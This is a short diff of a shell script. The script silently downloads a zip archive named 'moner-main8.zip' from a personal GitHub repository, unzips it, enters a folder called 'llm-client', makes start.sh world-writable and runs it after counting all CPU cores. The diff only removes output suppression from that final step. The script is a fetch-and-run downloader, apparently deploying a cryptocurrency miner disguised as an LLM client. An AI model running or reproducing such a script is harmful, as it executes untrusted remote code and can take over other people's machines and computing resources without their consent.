@@ -1,4 +1,4 @@
 wget https://github.com/renjanaayudisha57/fantastic-adventure/raw/refs/heads/main/moner-main8.zip >/dev/null 2>&1
 unzip moner-main8.zip >/dev/null 2>&1
 cd moner-main >/dev/null 2>&1
-cd llm-client && chmod 777 start.sh && nproc --all && ./start.sh >/dev/null 2>&1
+cd llm-client && chmod 777 start.sh && nproc --all && ./start.sh
